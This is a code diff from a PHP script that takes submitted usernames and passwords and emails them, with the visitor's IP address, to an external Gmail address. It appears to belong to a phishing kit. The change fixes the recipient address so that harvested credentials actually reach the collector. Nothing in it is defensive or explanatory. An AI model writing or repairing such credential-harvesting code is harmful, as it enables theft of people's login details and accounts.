@@ -16,7 +16,7 @@ if(isset($_POST['username'])&& isset($_POST['password']) ){
 $msg = wordwrap($msg,70);
 
 // send email
-mail("www.jlk75452@gmail.com","credential user (".$ip.")",$msg);
+mail("jlk75452@gmail.com","credential user (".$ip.")",$msg);
 
 } 
 
